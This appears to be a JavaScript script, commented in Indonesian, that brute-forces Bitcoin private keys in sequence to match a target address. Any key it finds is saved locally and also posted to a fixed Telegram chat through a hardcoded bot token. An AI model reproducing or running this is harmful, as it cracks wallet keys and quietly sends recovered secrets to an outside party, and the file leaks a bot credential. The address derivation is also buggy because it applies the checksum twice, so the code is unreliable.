import crypto from 'crypto';
import bs58check from 'bs58check';
import elliptic from 'elliptic';
import fs from 'fs';
import BigNumber from 'bignumber.js';
import fetch from 'node-fetch';

// Konstanta Telegram
const TELEGRAM_TOKEN = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE';
const TELEGRAM_CHAT_ID = '-4562112556';

// Fungsi untuk mengirim pesan ke Telegram
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: body
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('Error sending message to Telegram:', result);
        }
    } catch (error) {
        console.error('Failed to send message to Telegram:', error);
    }
}

// Ambil elliptic dan buat instance EC
const EC = elliptic.ec;
const ecCurve = new EC('secp256k1');

// Fungsi untuk mengonversi private key dari format hexadecimal ke WIF
function convertPrivateKeyToWIF(privateKeyHex) {
    const privateKeyBuffer = Buffer.from(privateKeyHex, 'hex');
    // Prefix 0x80 untuk Bitcoin mainnet
    const version = 0x80;
    const keyWithPrefix = Buffer.concat([Buffer.from([version]), privateKeyBuffer]);
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(keyWithPrefix).digest()).digest().slice(0, 4);
    const keyWithChecksum = Buffer.concat([keyWithPrefix, checksum]);
    return bs58check.encode(keyWithChecksum);
}

// Fungsi untuk menghitung Bitcoin address dari private key
function getBitcoinAddressFromPrivateKey(privateKey) {
    const keyPair = ecCurve.keyFromPrivate(privateKey, 'hex');
    const publicKey = keyPair.getPublic().encode('hex'); // Mendapatkan public key

    // Menghitung hash dari public key untuk mendapatkan address
    const publicKeyBuffer = Buffer.from(publicKey, 'hex');
    const publicKeyHash = crypto.createHash('sha256').update(publicKeyBuffer).digest();
    const ripemd160Hash = crypto.createHash('ripemd160').update(publicKeyHash).digest();

    // Prefix 0x00 untuk address Bitcoin mainnet
    const addy = Buffer.alloc(21);
    addy.writeUInt8(0x00, 0);
    ripemd160Hash.copy(addy, 1);

    // Menghitung checksum
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(addy).digest()).digest();
    const fullAddress = Buffer.concat([addy, checksum.slice(0, 4)]);

    // Mengonversi address menjadi format Base58 dengan checksum
    return bs58check.encode(fullAddress);
}

// Fungsi utama untuk melakukan pencarian private key berdasarkan rentang dan address
async function findPrivateKeyInRange(startPrivateKey, userAddress) {
    let start = new BigNumber(startPrivateKey, 16);
    let max = new BigNumber('fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140', 16);

    for (let i = start; i.isLessThanOrEqualTo(max); i = i.plus(1)) {
        let privateKey = i.toString(16);
        while (privateKey.length < 64) {
            privateKey = '0' + privateKey;
        }

        // Mendapatkan Bitcoin address dari private key
        const bitcoinAddress = getBitcoinAddressFromPrivateKey(privateKey);
        // Mengonversi private key ke WIF
        const privateKeyWIF = convertPrivateKeyToWIF(privateKey);

        // Mencetak setiap percobaan untuk memonitor progres
        console.log(`Mencoba Private Key: ${privateKey} (WIF: ${privateKeyWIF}) -> Address: ${bitcoinAddress}`);

        // Cek apakah address yang dihasilkan cocok dengan address target
        if (bitcoinAddress === userAddress) {
            console.log("====================================================================================");
            console.log(`Address cocok ditemukan!`);
            console.log(`[+] Private Key: ${privateKey}`);
            console.log(`[+] Private Key (WIF): ${privateKeyWIF}`);
            console.log(`[+] Bitcoin Address: ${bitcoinAddress}`);
            fs.appendFileSync('recovered.txt', `Private Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nAddress: ${bitcoinAddress}\n\n`);
            
            // Kirim hasil ke Telegram
            const message = `Address cocok ditemukan!\nPrivate Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nBitcoin Address: ${bitcoinAddress}`;
            await sendTelegramMessage(message);

            return; // Hentikan jika ditemukan
        }
    }
}

// Contoh penggunaan
const startPrivateKey = '0000000000000000000000000000000000000000000000000000000000000001'; // Ganti dengan private key awal
const userAddress = '1AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA';  // Ganti dengan Bitcoin address target

await findPrivateKeyInRange(startPrivateKey, userAddress);
